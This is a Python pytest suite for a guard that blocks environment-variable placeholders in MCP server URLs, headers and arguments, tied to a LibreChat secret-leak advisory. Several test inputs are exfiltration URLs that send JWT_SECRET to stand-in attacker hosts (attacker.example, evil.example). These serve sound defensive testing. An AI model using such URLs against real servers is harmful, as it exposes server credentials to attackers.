"""CVE-2026-32625 (LibreChat MCP server-URL env-interpolation secret leak).

LibreChat ≤ 0.8.3 (CVSS 9.6, CWE-200, published 2026-06-02) resolves
``${VAR}`` placeholders in a user-supplied MCP server URL against the
host ``process.env`` during schema validation, so an authenticated user
exfiltrates server-side secrets (``JWT_SECRET`` / ``CREDS_KEY`` /
``MONGO_URI``) by embedding them in a URL that dials an attacker host.
Patched in 0.8.4-rc1.

This suite pins, end-to-end:

- The brief's three core cases: a malicious URL with ``${JWT_SECRET}`` is
  blocked; a clean URL passes; an allowlisted non-secret var passes.
- All three interpolation forms (``${VAR}`` / ``$VAR`` / ``%VAR%``),
  header / arg template scanning, escape handling, and the preset wiring.

Primary sources (retrieved 2026-06-08):
  https://github.com/danny-avila/LibreChat/security/advisories/GHSA-6vqg-rgpm-qvf9
  https://www.thehackerwire.com/librechat-critical-credential-disclosure-via-mcp-server-url/
"""

from __future__ import annotations

import pytest

from agent_airlock import (
    MCPEnvInterpolationVerdict,
    MCPServerEnvInterpolationError,
    MCPServerEnvInterpolationGuard,
    mcp_server_env_interpolation_guard_defaults,
)
from agent_airlock.policy_presets import list_active

CVE = "CVE-2026-32625"


# ---------------------------------------------------------------------------
# The brief's three core cases
# ---------------------------------------------------------------------------


class TestCoreCases:
    def test_malicious_jwt_secret_url_blocked(self) -> None:
        guard = MCPServerEnvInterpolationGuard(advisory=CVE)
        d = guard.evaluate("https://attacker.example/collect?token=${JWT_SECRET}")
        assert d.allowed is False
        assert d.verdict is MCPEnvInterpolationVerdict.DENY_DOLLAR_BRACE
        assert d.matched_var == "JWT_SECRET"
        assert any(CVE in h for h in d.fix_hints)

    def test_clean_url_passes(self) -> None:
        guard = MCPServerEnvInterpolationGuard()
        d = guard.evaluate("https://api.example.com/mcp/v1?region=us-east-1")
        assert d.allowed is True
        assert d.verdict is MCPEnvInterpolationVerdict.ALLOW

    def test_allowlisted_non_secret_var_passes(self) -> None:
        guard = MCPServerEnvInterpolationGuard(allowed_vars={"REGION"})
        d = guard.evaluate("https://api-${REGION}.example.com/mcp")
        assert d.allowed is True


# ---------------------------------------------------------------------------
# All interpolation forms + scan surfaces
# ---------------------------------------------------------------------------


class TestInterpolationForms:
    @pytest.mark.parametrize(
        ("url", "verdict", "var"),
        [
            ("https://x/${MONGO_URI}", MCPEnvInterpolationVerdict.DENY_DOLLAR_BRACE, "MONGO_URI"),
            (
                "https://x/${CREDS_KEY:-d}",
                MCPEnvInterpolationVerdict.DENY_DOLLAR_BRACE,
                "CREDS_KEY",
            ),
            ("https://x/$CREDS_IV", MCPEnvInterpolationVerdict.DENY_BARE_DOLLAR, "CREDS_IV"),
            ("https://x/%JWT_SECRET%", MCPEnvInterpolationVerdict.DENY_PERCENT, "JWT_SECRET"),
        ],
    )
    def test_each_form_blocked(
        self, url: str, verdict: MCPEnvInterpolationVerdict, var: str
    ) -> None:
        d = MCPServerEnvInterpolationGuard().evaluate(url)
        assert d.verdict is verdict
        assert d.matched_var == var

    def test_header_template_scanned(self) -> None:
        d = MCPServerEnvInterpolationGuard().evaluate(
            {"url": "https://ok.example", "headers": {"Authorization": "Bearer ${JWT_SECRET}"}}
        )
        assert d.allowed is False
        assert d.matched_field == "headers.Authorization"
        assert d.matched_var == "JWT_SECRET"

    def test_args_list_template_scanned(self) -> None:
        d = MCPServerEnvInterpolationGuard().evaluate(
            {"command": "mcp-proxy", "args": ["--key", "${API_SECRET}"]}
        )
        assert d.allowed is False
        assert d.matched_field == "args[1]"
        assert d.matched_var == "API_SECRET"

    def test_escaped_and_literal_not_flagged(self) -> None:
        guard = MCPServerEnvInterpolationGuard()
        assert guard.evaluate("https://x/$$HOME").allowed is True
        assert guard.evaluate(r"https://x/\$HOME").allowed is True

    def test_empty_allowlist_denies_all_interpolation(self) -> None:
        guard = MCPServerEnvInterpolationGuard()  # empty allowlist
        assert guard.evaluate("https://x/${ANYTHING}").allowed is False

    def test_allowlist_is_per_variable(self) -> None:
        guard = MCPServerEnvInterpolationGuard(allowed_vars={"REGION"})
        # REGION allowed, but JWT_SECRET in the same URL still denies.
        d = guard.evaluate("https://${REGION}.host/${JWT_SECRET}")
        assert d.allowed is False
        assert d.matched_var == "JWT_SECRET"

    def test_none_and_empty_allowed(self) -> None:
        guard = MCPServerEnvInterpolationGuard()
        assert guard.evaluate(None).allowed is True
        assert guard.evaluate("").allowed is True

    def test_bare_str_allowlist_raises(self) -> None:
        with pytest.raises(TypeError, match="bare str"):
            MCPServerEnvInterpolationGuard(allowed_vars="REGION")  # type: ignore[arg-type]


# ---------------------------------------------------------------------------
# Preset wiring
# ---------------------------------------------------------------------------


class TestPreset:
    def test_canonical_metadata(self) -> None:
        p = mcp_server_env_interpolation_guard_defaults()
        assert p["preset_id"] == "mcp_server_env_interpolation_guard"
        assert p["severity"] == "critical"
        assert p["default_action"] == "deny"
        assert p["owasp"] == "MCP01"
        assert p["cves"] == ("CVE-2026-32625",)
        assert isinstance(p["guard"], MCPServerEnvInterpolationGuard)

    def test_check_raises_on_secret_interpolation(self) -> None:
        p = mcp_server_env_interpolation_guard_defaults()
        assert p["check"]("https://api.example.com/mcp") is None
        with pytest.raises(MCPServerEnvInterpolationError) as exc:
            p["check"]("https://evil.example/?t=${JWT_SECRET}")
        assert any(CVE in h for h in exc.value.fix_hints)
        assert exc.value.decision.matched_var == "JWT_SECRET"

    def test_allowlist_threaded_through_preset(self) -> None:
        p = mcp_server_env_interpolation_guard_defaults(allowed_vars={"REGION"})
        assert p["check"]("https://api-${REGION}.example.com") is None

    def test_discoverable_via_list_active(self) -> None:
        assert "mcp_server_env_interpolation_guard_defaults" in {m.preset_id for m in list_active()}
